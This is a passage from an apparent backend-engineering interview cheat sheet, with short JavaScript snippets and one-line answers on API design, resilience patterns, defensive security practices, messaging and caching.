// 4. Disable introspection in production:
introspection: process.env.NODE_ENV !== 'production'

// 5. Persisted queries: only allow pre-approved queries
// 6. Field-level authorization in resolvers, not just top-level
// 7. Never expose stack traces in errors
```

**Q24–Q60: Backend patterns**
```javascript
// Q24. gRPC streaming patterns:
// Unary: request/response (like REST)
// Server streaming: one request, stream of responses (real-time updates)
// Client streaming: stream of requests, one response (file upload, analytics)
// Bidirectional: full-duplex streaming (chat, gaming)

// Q25. Message broker patterns:
// Point-to-point (Queue): one producer, one consumer — work queue
// Publish-subscribe (Topic): one producer, many consumers — event broadcast
// Request-reply: RPC over messaging — correlation ID pattern

// Q26. Idempotency key pattern:
async function processPayment(idempotencyKey, paymentData) {
  const existing = await redis.get(`idem:${idempotencyKey}`);
  if (existing) return JSON.parse(existing); // return cached result

  const result = await chargeCard(paymentData);
  await redis.setEx(`idem:${idempotencyKey}`, 86400, JSON.stringify(result));
  return result;
}

// Q27. Webhook security (HMAC verification):
function verifyWebhook(payload, signature, secret) {
  const expected = crypto.createHmac('sha256', secret).update(payload).digest('hex');
  return crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(`sha256=${expected}`));
}

// Q28. API pagination best practices:
// Cursor: consistent, handles insertions, for large/real-time data
// Offset: simple, allows jumping to page, for stable data
// Keyset: like cursor but uses existing DB columns (no extra field)
// Always include: total count, has_next, has_prev, links

// Q29. HATEOAS (Hypermedia):
{ "id": "123", "name": "Alice",
  "_links": {
    "self": { "href": "/users/123" },
    "orders": { "href": "/users/123/orders" },
    "edit": { "href": "/users/123", "method": "PATCH" }
  }
}

// Q30. API backward compatibility:
// Never remove fields (mark deprecated instead)
// Never change field types
// New fields should be optional with defaults
// New required fields need migration plan
// Version major changes (v1 → v2)

// Q31. Content negotiation:
app.get('/users/:id', (req, res) => {
  const user = getUser(req.params.id);
  res.format({
    'application/json': () => res.json(user),
    'application/xml':  () => res.send(toXML(user)),
    'text/html':        () => res.send(renderHTML(user)),
    default:            () => res.status(406).send('Not Acceptable'),
  });
});

// Q32. Request tracing with correlation IDs:
app.use((req, res, next) => {
  req.correlationId = req.headers['x-correlation-id'] ?? `${Date.now()}-${Math.random()}`;
  res.setHeader('x-correlation-id', req.correlationId);
  next();
});

// Q33. API gateway pattern benefits:
// Single entry point, auth/rate-limit once, routing, aggregation
// vs BFF (Backend for Frontend): one gateway per client type

// Q34. Health check design:
app.get('/health/live',  (req, res) => res.json({ status: 'ok' }));
app.get('/health/ready', async (req, res) => {
  const checks = await Promise.allSettled([dbCheck(), redisCheck(), externalApiCheck()]);
  const allOk = checks.every(c => c.status === 'fulfilled');
  res.status(allOk ? 200 : 503).json({
    status: allOk ? 'ok' : 'degraded',
    checks: { db: checks[0].status, redis: checks[1].status, api: checks[2].status }
  });
});

// Q35. Circuit breaker states:
// CLOSED → requests flow normally
// OPEN → all requests fail fast (no calls to service)
// HALF_OPEN → allow one test request → if OK: CLOSED, else: OPEN

// Q36. Bulkhead pattern:
// Separate thread pools / connection limits per downstream service
// One slow service can't exhaust resources and block all others

// Q37. Retry semantics:
// Idempotent ops: safe to retry (GET, PUT, DELETE with same params)
// Non-idempotent: dangerous to retry (POST creates duplicate)
// Solution: idempotency keys for POST operations

// Q38. Timeout hierarchy:
// Client timeout > Server timeout > Downstream timeout
// Ensures: client gets response before giving up, server cleans up

// Q39. Authentication middleware order:
// 1. Parse token
// 2. Verify signature/expiry
// 3. Load user from DB/cache
// 4. Attach to request
// 5. Route-specific authorization check

// Q40–Q65: Security patterns
// Q40. Input validation layers: client-side (UX) + server-side (security)
// Q41. Output encoding: HTML entities, SQL params, JSON escaping
// Q42. Path traversal prevention: path.resolve + startsWith check
// Q43. SSRF prevention: whitelist outbound hosts, block internal IPs
// Q44. XML injection: use JSON instead, or XML parser with entity expansion disabled
// Q45. Command injection: never shell(), use child_process.spawn with args array
// Q46. ReDoS: avoid catastrophic backtracking in regex, test with ReDoS checkers
// Q47. Timing attacks: use timingSafeEqual for secret comparison
// Q48. Mass assignment: whitelist allowed fields, never spread req.body directly
// Q49. Password hashing: bcrypt cost 12, argon2id preferred
// Q50. Secrets rotation: Vault dynamic secrets, AWS Secrets Manager rotation
// Q51. TLS configuration: TLS 1.2+, strong cipher suites, HSTS
// Q52. JWT algorithm confusion: specify algorithm explicitly, reject none
// Q53. OAuth2 PKCE: prevent auth code interception in SPAs/mobile
// Q54. Dependency confusion: use scoped packages, private registry
// Q55. Supply chain security: SBOM, lock files, verify checksums
// Q56. Container security: non-root, read-only FS, seccomp, capabilities
// Q57. Principle of least privilege: minimal permissions, separate service accounts
// Q58. Security headers checklist: CSP, HSTS, X-Frame, X-Content-Type
// Q59. OWASP Top 10 checklist per endpoint
// Q60. Penetration testing: SAST (Semgrep, CodeQL) + DAST (OWASP ZAP)

// Q61–Q100: Messaging and caching
// Q61. Dead letter queue processing strategy
// Q62. Message ordering guarantees in Kafka (partition-level only)
// Q63. Consumer group rebalancing impact and mitigation
// Q64. Kafka exactly-once semantics: idempotent producer + transactional API
// Q65. SQS vs Kafka: managed vs self-managed, retention, replay capability
// Q66. RabbitMQ exchanges: direct, fanout, topic, headers
// Q67. Message serialization: JSON, Protobuf, Avro comparison
// Q68. Schema registry for Kafka/Avro: Confluent Schema Registry
// Q69. Event versioning strategies: forward/backward compatibility
// Q70. CQRS projection rebuilding from event stream
// Q71. Cache invalidation strategies: TTL, event-driven, write-through
// Q72. Cache stampede prevention: mutex, probabilistic early expiration
// Q73. Redis cluster vs sentinel vs standalone tradeoffs
// Q74. Redis Lua scripts for atomic operations
// Q75. Redis streams vs pub/sub: persistence, consumer groups, replay
// Q76. Memcached vs Redis: simple vs feature-rich
// Q77. CDN cache headers: s-maxage, stale-while-revalidate, Surrogate-Key
// Q78. Cache-Control: immutable for hashed assets
// Q79. Vary header for content negotiation caching
// Q80. Browser caching vs CDN caching layers

// Q81–Q150: Advanced backend topics
// Q81. Database-backed rate limiting (Redis sliding window)
// Q82. Distributed rate limiting across multiple servers
// Q83. API key rotation without downtime
// Q84. JWT token introspection endpoint (OAuth2)
// Q85. OpenID Connect (OIDC) provider implementation
// Q86. SAML vs OIDC: enterprise SSO comparison
// Q87. mTLS for service-to-service authentication
// Q88. Signed URLs for private S3 resources
// Q89. Content-based deduplication
// Q90. Optimistic locking with version numbers
// Q91. Pessimistic locking with SELECT FOR UPDATE
// Q92. Two-phase locking across distributed services
// Q93. Saga orchestration vs choreography
// Q94. Process manager pattern for long-running operations
// Q95. Polling vs webhooks vs Server-Sent Events vs WebSockets
// Q96. Long polling implementation
// Q97. Server-Sent Events reconnection and event ID
// Q98. GraphQL subscriptions over WebSocket
// Q99. Request coalescing / deduplication
// Q100. Response streaming for large datasets
// Q101–Q150. REST API design, microservice communication, event sourcing patterns
```
